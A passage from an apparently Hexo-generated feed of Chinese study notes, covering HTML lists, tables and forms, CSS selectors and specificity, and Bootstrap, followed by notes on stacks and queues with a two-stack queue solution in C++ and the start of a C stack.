class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span>         有序列表：默认样式--数字顺序</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  使用：新闻条，页面主导航，轮播图</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  type属性：更改列表符号类型--a,A,i,I</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>  start属性：控制列表符号开始位置，属性值只能为数字</span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span>   </span><br><span class="line">     </span><br><span class="line">          </span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span>         自定义列表</span><br><span class="line">  <span class="tag">&lt;<span class="name">dt</span>&gt;</span>放一个名词<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dd</span>&gt;</span>对该名词的解释<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dt</span>&gt;</span><span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span>  </span><br></pre></td></tr></table></figure>


<p><strong>HTML 表格</strong></p>
<p><strong>表格标签：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span>        定义表格</span><br><span class="line">   <span class="tag">&lt;<span class="name">caption</span>&gt;</span>表格标题<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span>        定义行</span><br><span class="line">     <span class="tag">&lt;<span class="name">th</span>&gt;</span>表头1<span class="tag">&lt;/<span class="name">th</span>&gt;</span> 定义列</span><br><span class="line">     <span class="tag">&lt;<span class="name">th</span>&gt;</span>表头2<span class="tag">&lt;/<span class="name">th</span>&gt;</span>   table属性：</span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>                  width=&quot;&quot;        宽</span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span>                   height=&quot;&quot;       高</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            border=&quot;&quot;       边框</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            bordercolor=&quot;&quot;  边框颜色</span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>                  bgcolor=&quot;&quot;      背景颜色</span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span>                   cellspacing=&quot;0&quot; 边框间距</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            cellpadding=&quot;0&quot; 边框与内容之间的距离</span><br><span class="line">     <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>            align=&quot;&quot;         水平对齐方式,属性值：right,center,left</span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span>                  valign=&quot;&quot;        垂直对齐方式,属性值：top,middle,bottom</span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">合并单元格：均写在<span class="tag">&lt;<span class="name">td</span>&gt;</span>标签中,*和谁合并删掉谁       </span><br><span class="line">  colspan=&quot;数字&quot;   合并列 数字代表合并几个单元格</span><br><span class="line">  rowspan=&quot;数字&quot;   合并行 数字代表合并几个单元格</span><br><span class="line">合并列与合并行相结合：先合并列，再合并行</span><br><span class="line">对齐方式：</span><br><span class="line">  align=&quot;&quot;         水平对齐方式,属性值：right,center,left</span><br><span class="line">  valign=&quot;&quot;        垂直对齐方式,属性值：top,middle,bottom</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTML 表单中有两种类型的单元格：</span><br><span class="line"></span><br><span class="line">    表头单元格 - 包含表头信息（由 th 元素创建）</span><br><span class="line">    标准单元格 - 包含数据（由 td 元素创建）</span><br><span class="line"></span><br><span class="line">th 元素内部的文本通常会呈现为居中的粗体文本，而 td 元素内的文本通常是左对齐的普通文本</span><br></pre></td></tr></table></figure>

<h2 id="HTML（四）表单"><a href="#HTML（四）表单" class="headerlink" title="HTML（四）表单"></a>HTML（四）表单</h2><p>1.表单本身为一个框架，表单中有很多 <strong>控件（元素）</strong><br>2.本质：完成双向交互，向服务器提交信息，<strong>搜集用户信息</strong><br>3.表单的使用：搜索框，登录框，文件上传，注册，留言板等等</p>
<p><strong>表单标签：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">属性：</span><br><span class="line">     name=&quot;&quot;     表单的名称</span><br><span class="line">     action=&quot;&quot;   属性值为 &quot;接口地址&quot; 把数据提交到服务器的 URL</span><br><span class="line">                 如果为空则提交到当前页面，也可采用绝对路径与相对路径</span><br><span class="line">     method=&quot;&quot;   数据传输方式：&quot;get / post&quot;</span><br><span class="line">	 enctype	 提交类型</span><br><span class="line">		当上传文件时，要写该属性，</span><br><span class="line">		enctype=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">		enctype=&quot;multipart/form-data&quot;</span><br><span class="line">	 target		 在何处打开目标 URL	</span><br><span class="line">     </span><br><span class="line">表单内部元素： <span class="tag">&lt;<span class="name">input</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>get 与 post</strong></p>
<blockquote>
<p>get 默认值，显示提交，长度限制2KB，向服务器索取数据<br>post ”安全隐式提交“，无长度限制，一般准备数据提交后服务器处理再交付<br>get 参数提交到URL中，在URL中有显示，且 URL长度有限制<br>       post 上传文件等  数据流  HTTP请求正文中</p>
</blockquote>
<p><strong>input 标签</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> &gt;</span></span><br><span class="line">属性：</span><br><span class="line">  type       决定 input 所生成的表单类型</span><br><span class="line">  value      作为 input 的值，根据 type 的不同而作用不同</span><br><span class="line">  maxlength  最大长度</span><br><span class="line">  size       以字符为单位控制input的大小</span><br><span class="line">  name		 属性名</span><br></pre></td></tr></table></figure>
<p><strong>input标签 的 type 属性</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">password   密码框	</span><br><span class="line">text       文本框</span><br><span class="line">radio      单选框 （性别 name 值必须相同才能是单选框）</span><br><span class="line">checkbox   复选框 </span><br><span class="line">reset      重置按钮 </span><br><span class="line">submit     提交按钮</span><br><span class="line"><span class="selector-tag">button</span>     空按钮</span><br><span class="line">file       文件域 </span><br><span class="line">hidden     隐藏内容 </span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/13/MTyhaoeVqJmXt5w.png" alt="image-20211113175140020"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">enctype</span><br><span class="line">application/x-www-form-urlencoded    默认值</span><br><span class="line">multipart/form-data  上传文件时使用</span><br></pre></td></tr></table></figure>

<p> 文本域：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">&quot;&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p> 下拉列表：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;select name=&quot;&quot; size=&quot;&quot;&gt;</span><br><span class="line">      &lt;options&gt; </span><br><span class="line">      </span><br><span class="line">      &lt;/options&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">disabled</span><br><span class="line">readonly</span><br></pre></td></tr></table></figure>

<p>页面的嵌套:<br>iframe：从一个页面中引入另一个页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;1.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;frame1&quot;</span>&gt;</span>1.html<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;frame1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;1.html&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210106161704671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>管理控制台：</strong></p>
<blockquote>
<p><strong>查看器</strong>：所查看的内容叫做  DOM –即文档对象模型–即树形结构，浏览器构造的<br><strong>控制台</strong>：可以执行JS代码<br><strong>网络</strong>：显示整个页面的所有网络请求  页面的网络连接<br><strong>存储</strong>：存储了页面的Cookie信息</p>
</blockquote>
<h2 id="CSS-（五）层叠样式表"><a href="#CSS-（五）层叠样式表" class="headerlink" title="CSS （五）层叠样式表"></a>CSS （五）<strong>层叠样式表</strong></h2><p>css 注释：<code>/* */</code></p>
<p><strong>一、语法组成：由 选择符 和 声明 构成</strong></p>
<blockquote>
<p>1.选择符用于选择 <strong>标签</strong><br>2.声明分为：<strong>属性</strong> 和 <strong>属性值</strong>，二者之间用冒号连接<br>3.声明放于花括号中，每条声明以分号结束<br><strong>注：所有CSS代码必须放在CSS样式表中</strong></p>
</blockquote>
<p><strong>二、CSS样式表：</strong></p>
<p><strong>1.内部样式表</strong> — 创建：<strong>style 标签</strong>，最好放在 head 标签中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210111004211856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>2.外部样式表</strong> — 创建：新建一个.css文件(开头最好写上<code>@charset &quot;utf-8&quot;; </code>用于控制当前编码格式)，然后导入到 html 页面内</p>
<p><strong>导入方式：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">方法一：<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./text.css&quot;</span>&gt;</span></span><br><span class="line">  rel=&quot;stylesheet&quot; 与css样式表建立关联性</span><br><span class="line">  href=&quot;&quot;          导入css样式表的路径</span><br><span class="line">  </span><br><span class="line">方法二：<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">           <span class="keyword">@import</span> url(路径);</span></span><br><span class="line"><span class="css">       </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">区别：</span><br><span class="line">1.本质：link是一个html标签；@import是css提供的一个导入方法</span><br><span class="line">2.加载顺序不同：link--导入的css代码与html同时加载；@import--等待html结构加载完毕后再加载样式</span><br><span class="line">3.兼容性：link兼容性较好</span><br><span class="line">4.JS操作dom的区别</span><br></pre></td></tr></table></figure>

<p><strong>3.内联样式表（内行样式）</strong>— 创建： &lt;标签 style=”样式表内容”&gt;&lt;/标签&gt;</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;border: 1px solid red; padding 10px&quot;</span>&gt;</span></span><br><span class="line">    测试</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>样式表的权重关系</strong>：<strong>体现了CSS的</strong> <strong>层叠性</strong></p>
<blockquote>
<p>1.<strong>内联样式表</strong>  权重最高<br>2.<strong>内部样式表</strong> 和 <strong>外部样式表</strong> 的权重关系与先后顺序有关，后面覆盖之前的<br><strong>注</strong>：仅仅覆盖产生冲突的属性（即相同的属性），不同的属性将继续执行。</p>
</blockquote>
<h2 id="CSS（六）选择符及其权重"><a href="#CSS（六）选择符及其权重" class="headerlink" title="CSS（六）选择符及其权重"></a>CSS（六）选择符及其权重</h2><p><strong>一、类型选择符 (标签选择符)</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">将html的 标签 当作 选择符 </span><br><span class="line">特点：将会选择该页面中所有同类型的标签 </span><br><span class="line">使用：想要更改清除某标签的默认样式时，或者是想要统一某个标签样式时</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210111234358280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>二、id 选择器</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">使用：</span><br><span class="line">1.起id名称：给指定标签起一个 id名称</span><br><span class="line">   &lt;标签 id=&quot;名称&quot;&gt;&lt;/标签&gt; </span><br><span class="line">2. 写样式：#id名称&#123;css代码&#125; </span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>特点</strong>：<strong>唯一性</strong> – 同一个页面只能出现一次,主要用于划分网页外围结构</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210111234622484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>id命名规范：</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20210111180429726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>三、类选择器 (class选择器)</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">使用：</span><br><span class="line">1.起class名称：</span><br><span class="line"> &lt;标签 class=&quot;名称 名称 名称...&quot;&gt;&lt;/标签&gt;</span><br><span class="line">2.写样式：.class名称&#123;css代码&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>特点</strong>:<br>1.同一个class可重复出现<br>2.一个标签可以有多个类名，空格隔开<br>3.可以用于调用一类样式</p>
</blockquote>
<p><strong>四、包含选择器 (关联选择器)</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">使用：嵌套</span><br><span class="line">.父元素选择符 .子元素选择符&#123;css代码&#125;</span><br><span class="line">也可使用 #  使用较灵活</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">table a&#123;</span><br><span class="line">	color: #000;</span><br><span class="line">&#125;</span><br><span class="line">仅仅控制 table 中的 a 标签</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>五、群组选择符</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">使用：</span><br><span class="line">选择符1，选择符2，选择符3...&#123;css代码&#125;</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">h1,h2,h3&#123;</span><br><span class="line">	color: #111;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>2<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>3<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>六、通配符：</strong>  * 选中页面中所有标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">    margin:0;   盒子外围间距</span><br><span class="line">    padding:0;  盒子内部间距</span><br><span class="line"> &#125;</span><br><span class="line"> 将页面中所有标签的 页面间距 均清零</span><br><span class="line"> 因此每次在样式开头记得写上</span><br></pre></td></tr></table></figure>

<p><strong>七、伪类选择器</strong>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> a:link&#123;color: #ff0000; text-decoration: none&#125;    初始状态的样式</span><br><span class="line"> a:visited&#123;color: #00ff 00; text-decoration: none&#125; 点击过后的样式</span><br><span class="line"> a:hover&#123;color: #0000ff; text-decoration: none&#125;   鼠标划过的样式</span><br><span class="line"> a:active&#123;color: #0f0f00; text-decoration: none&#125;  鼠标按下的样式</span><br><span class="line"> </span><br><span class="line">注：不要更改这四个样式的顺序</span><br></pre></td></tr></table></figure>
<p><strong>hover</strong></p>
<p>可更改自身以及自己子元素的样式，无法更改其父元素的样式</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">常用方式：交互</span><br><span class="line">a:&#123;</span><br><span class="line">    color:black; 默认颜色黑色</span><br><span class="line">  &#125;</span><br><span class="line">a:hover&#123;</span><br><span class="line">    color:red;   鼠标划过时红色</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>实现划过父元素更改子元素：<br><img src="https://img-blog.csdnimg.cn/20210111233526248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>划过子元素更改父元素无法实现</p>
<h2 id="CSS-选择符的权重"><a href="#CSS-选择符的权重" class="headerlink" title="CSS 选择符的权重"></a>CSS 选择符的权重</h2><p><strong>1. ! important &gt; 内联样式 &gt; id &gt; class &gt; 标签</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">内联样式       1000</span><br><span class="line">id            100</span><br><span class="line">class、伪类    10</span><br><span class="line">标签           1</span><br><span class="line">通配符         0   </span><br><span class="line">包含选择符      权重是所有权重之和</span><br><span class="line">群组选择符      权重保持不变，看顺序，后覆盖前</span><br></pre></td></tr></table></figure>
<p><strong>2.CSS选择符的权重关系体现CSS的层叠性</strong></p>
<p><strong>3.开发者样式 &gt; 读者样式 &gt; 浏览器样式</strong></p>
<h2 id="CSS-中常见的属性"><a href="#CSS-中常见的属性" class="headerlink" title="CSS 中常见的属性"></a>CSS 中常见的属性</h2><p><strong>color 颜色属性：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">background-color: rgba(255,255,255,0);  #最后一个代表透明度</span><br><span class="line">background-color: #FFFFFF;</span><br></pre></td></tr></table></figure>

<p><strong>font 属性：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">font-size:							#大小</span><br><span class="line">font-family:&quot;Microsoft Yahei&quot;		#字体：</span><br><span class="line">font-style:					#normal正常 italic斜体  oblique 倾斜的字体 </span><br><span class="line">font-weight:						#字体加粗 bold</span><br></pre></td></tr></table></figure>

<p><strong>文本属性：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">text-indent:30px			首行缩进</span><br><span class="line">text-overflow:				文本溢出是否使用 省略号</span><br><span class="line">white-space:nowrap			强制在同一行显示文本</span><br><span class="line">overflow:hidden; white-space:nowrap; text-overflow:ellipsis;		  常用的搭配</span><br><span class="line"></span><br><span class="line">text-align: left center right  位置</span><br><span class="line">text-decoration: none underline line-through贯穿线</span><br><span class="line">text-shadow:1px 1px rgba(0,0,0,0.3)  阴影</span><br><span class="line">letter-spacing:  文字或字母间距</span><br><span class="line">line-height:  行高</span><br><span class="line">color:   颜色</span><br></pre></td></tr></table></figure>

<p><strong>边框属性：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">border: 宽度 样式 颜色</span><br><span class="line">border-color:</span><br><span class="line">border-style:</span><br><span class="line">border-width:</span><br><span class="line">border-left-color:</span><br><span class="line">border-left-style:</span><br><span class="line">border-left-width:</span><br><span class="line"></span><br><span class="line">border-radius:  圆角处理</span><br><span class="line">box-shadow:  设置或检索对象阴影</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/14/ExTY2ZRQ3wvcHgN.png" alt="image-20211114142429453"></p>
<p>补充：css 响应式布局</p>
<h2 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h2><p>最受欢迎的 css js html框架，用于开发响应式布局</p>
<p>bootstrap 差钱全部依赖 JQuery</p>
<p> 下载：<a href="https://v3.bootcss.com/">https://v3.bootcss.com/</a></p>
<p>Jquery 下载：<a href="https://jquery.com/">https://jquery.com/</a></p>
<p><img src="https://i.loli.net/2021/11/14/LHfTpVm3bh7r6dv.png" alt="image-20211114145951756"></p>
<p>一定要导入以上三个文件</p>
<p>然后在 class 里面改指定的名称即可</p>
<p><img src="https://i.loli.net/2021/11/14/nUrMakF2jXVN71C.png" alt="image-20211114150231172"></p>
<p> 能够看到 bootstrap 在之前的基础上有默认添加了一些样式用于美化</p>
<p>可以在官网看具体用法：<a href="https://v3.bootcss.com/css/">https://v3.bootcss.com/css/</a></p>
<p><img src="https://i.loli.net/2021/11/14/1Na7qJsE3b6Q5lA.png" alt="image-20211114153722056"></p>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>三、栈和队列</title>
    <url>/2025/12/03/%E4%B8%89%E3%80%81%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="三、栈和队列"><a href="#三、栈和队列" class="headerlink" title="三、栈和队列"></a>三、栈和队列</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">数字转字符串：<span class="built_in">to_string</span>()</span><br><span class="line">字符串转数字：<span class="built_in">stoi</span>()、<span class="built_in">stol</span>()、<span class="built_in">stof</span>()、<span class="built_in">stod</span>()等等</span><br><span class="line">大顶堆（降序）</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>&gt; big_heap;   </span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>,vector&lt;<span class="keyword">int</span>&gt;,less&lt;<span class="keyword">int</span>&gt;&gt; big_heap2;   </span><br><span class="line">小顶堆（升序）</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>,vector&lt;<span class="keyword">int</span>&gt;,greater&lt;<span class="keyword">int</span>&gt;&gt; small_heap;   </span><br></pre></td></tr></table></figure>
<h3 id="232-用栈实现队列"><a href="#232-用栈实现队列" class="headerlink" title="232 用栈实现队列"></a>232 用栈实现队列</h3><p>仅使用两个栈实现先入先出队列。队列应当支持一般队列支持的所有操作（push、pop、peek、empty）：</p>
<p>实现 MyQueue 类：</p>
<pre><code>void push(int x) 将元素 x 推到队列的末尾
int pop() 从队列的开头移除并返回元素
int peek() 返回队列开头的元素
boolean empty() 如果队列为空，返回 true ；否则，返回 false
</code></pre>
<p>只能使用标准的栈操作 —— 也就是只有 push to top, peek/pop from top, size, 和 is empty 操作是合法的。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在push数据的时候，只要数据放进输入栈就好，但在pop的时候，操作就复杂一些，输出栈如果为空，就把进栈数据全部导入进来（注意是全部导入），再从出栈弹出数据，如果输出栈不为空，则直接从出栈弹出数据就可以了。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    最后如何判断队列为空呢？如果进栈和出栈都为空的话，说明模拟的队列为空了</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    stack&lt;<span class="keyword">int</span>&gt; inStack,outStack;<span class="comment">//两个栈，输入栈 和 输出栈</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">in2out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!inStack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            outStack.<span class="built_in">push</span>(inStack.<span class="built_in">top</span>());<span class="comment">//inStack不为空的话，传给outStack</span></span><br><span class="line">            <span class="comment">//输入栈不为空的话，全输出至 输出栈，此时如果输出栈输出，则是按照队列的顺序输出</span></span><br><span class="line">            inStack.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyQueue</span>() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        inStack.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(outStack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="built_in">in2out</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> x = outStack.<span class="built_in">top</span>();</span><br><span class="line">        outStack.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(outStack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="built_in">in2out</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> outStack.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> inStack.<span class="built_in">empty</span>() &amp;&amp; outStack.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>* stk;</span><br><span class="line">    <span class="keyword">int</span> stkSize;</span><br><span class="line">    <span class="keyword">int</span> stkCapacity;</span><br><span class="line">&#125; Stack;</span><br><span class="line"></span><br><span class="line"><span class="function">Stack* <span class="title">stackCreate</span><span class="params">(<span class="keyword">int</span> cpacity)</span> </span>&#123;</span><br><span class="line">    Stack* ret = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Stack));</span><br><span class="line">    ret-&gt;stk = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * cpacity);</span><br><span class="line">    ret-&gt;stkSize = <span class="number">0</span>;</span><br><span class="line">    ret-&gt;stkCapacity = cpacity;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stackPush</span><span 